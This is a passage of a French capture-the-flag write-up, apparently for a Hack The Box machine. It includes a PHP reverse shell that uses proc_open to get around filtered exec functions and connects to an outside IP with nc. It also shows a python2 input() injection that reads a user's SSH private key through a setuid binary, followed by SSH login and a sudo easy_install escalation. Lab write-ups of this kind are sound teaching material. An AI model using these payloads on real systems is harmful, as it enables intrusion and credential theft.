+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;file&#34;</span>,<span style="color:#e6db74">&#34;/tmp/error-output.txt&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>)
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$cwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/tmp&#39;</span>;
+</span></span><span style="display:flex;"><span>$env<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;some_option&#39;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;aeiou&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$process<span style="color:#f92672">=</span><span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#39;sh&#39;</span>,$descriptorspec,$pipes,$cwd,$env);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_resource</span>($process)){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>],<span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.172 9001 &gt;/tmp/f&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">stream_get_contents</span>($pipes[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $return_value <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_close</span>($process);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;command returned </span><span style="color:#e6db74">$return_value\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><blockquote>
+<p>J’utilise un reverse shell spécial qui bypass exec(), shell_exec() et toutes les fonctions de ce type car elles sont filtrées</p>
+</blockquote>
+<p>On lance notre netcat, on upload le fichier puis on le visite&hellip;</p>
+<h1 id="lateral-move">Lateral Move</h1>
+<p>Maintenant qu&rsquo;on est connectés à la machine, routine classique pour stabiliser le shell</p>
+<pre tabindex="0"><code>python3 -c ‘import pty;pty.spawn(”/bin/bash”)’
+</code></pre><pre tabindex="0"><code>export TERM=xterm
+</code></pre><p>Et on se contentera de ça !</p>
+<p>En regardant dans le home de developer, il y a un dossier “<code>dev</code>”, dans lequel se trouve un <code>siteisup_test.py</code> et un <code>siteisup</code></p>
+<p>En faisant un <code>ls -la</code>, on voit que le fichier <code>siteisup</code> a le <code>setuid bit</code>, ce qui veux dire qu’il est executé en tant que l’owner du fichier, soit en tant que <code>developer</code></p>
+<p><img alt="2022-12-08-183857_930x1026_scrot" src="https://user-images.githubusercontent.com/77807503/206529938-755d3c14-48bb-4964-a103-942fd86565a1.png"></p>
+<p>Partons du principe qu&rsquo;il s&rsquo;agit seulement d&rsquo;une version compilée du .py qui se trouve dans le même répertoire</p>
+<p>Il retourne cette erreur au lancement:</p>
+<pre tabindex="0"><code>SyntaxError: Missing parentheses in call to &#39;print&#39;. Did you mean print(&#34;Website is up&#34;)?
+</code></pre><p>On peut cat le <code>.py</code> pour essayer de comprendre un peu mieux ce qu&rsquo;il se passe:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter URL here:&#34;</span>)
+</span></span><span style="display:flex;"><span>page <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> page<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#34;Website is up&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#34;Website is down&#34;</span>
+</span></span></code></pre></div><p>Cette syntaxe du print est propre à python2, et on peut se douter que ceci n’a pas été laissé au hasard</p>
+<p>On cherche donc des vulnérabilités de python2 sur google, et assez vite on peut se rendre compte que toutes les input en python2 sont injectables</p>
+<p>En entrant un payload dans un input, ce dernier est executé avant que le programme plante</p>
+<p>On va donc lancer le fichier avec python2 puis entrer ce payload dans l’input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cat /home/developer/.ssh/id_rsa&#34;</span>)
+</span></span></code></pre></div><p>Ce dernier va simplement lire la clé SSH de l’user <code>developer</code></p>
+<p>Bien évidemment, en lançant le .py, il retourne une permission denied, puisque le fichier n’a pas le <code>setuid bit</code></p>
+<p><img alt="2022-12-08-184616_930x1026_scrot" src="https://user-images.githubusercontent.com/77807503/206530087-0f7a497f-3e72-497a-b9fb-674a607980bb.png"></p>
+<p>En essayant le même payload mais cette fois dans l&rsquo;input du binaire, ça fonctionne, et on a la clé de <code>developer</code></p>
+<p><img alt="2022-12-08-184731_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/206530137-52159fbe-e846-4f61-8bdc-478e6316566d.png"></p>
+<p>On save la clé localement puis on met à jour ses permissions pour pouvoir l&rsquo;utiliser avec la commande <code>ssh</code></p>
+<pre tabindex="0"><code>chmod 700 id_rsa.key
+</code></pre><p>On se <code>ssh</code> en tant que <code>developer</code></p>
+<pre tabindex="0"><code>ssh -i id_rsa.key developer@siteisup.htb
+</code></pre><p><img alt="2022-12-08-184929_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/206532498-83e17824-9b76-40cb-9054-4ce86793ade0.png"></p>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>Le root étant extrêmement facile, on va pouvoir passer assez vite dessus</p>
+<pre tabindex="0"><code>sudo -l
+</code></pre><p>Cela nous montre que <code>developer</code> peut utiliser le binaire <code>/usr/local/bin/easy_install</code> avec <code>sudo</code></p>
+<p>On trouve <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo">cet exploit</a> sur GTFOBins</p>
+<p><img alt="2022-12-08-185201_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/206530338-5c55b870-ef6c-47a2-951d-36b88ba6f0d1.png"></p>
+<h6 id="back-to-top"><a href="/"><em>back to top</em></a></h6>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="/tags/linux/">linux</a></span>
+        <span class="tag"><a href="/tags/fuzzing/">fuzzing</a></span>
+        <span class="tag"><a href="/tags/file-upload/">file upload</a></span>
+        <span class="tag"><a href="/tags/filters-bypass/">filters bypass</a></span>
+        <span class="tag"><a href="/tags/cve/">cve</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="/">conflict</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>framework: <a href="http://gohugo.io">Hugo</a></span><span>in rami malek we trust</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+
+
+
+
+    </body>
+</html>
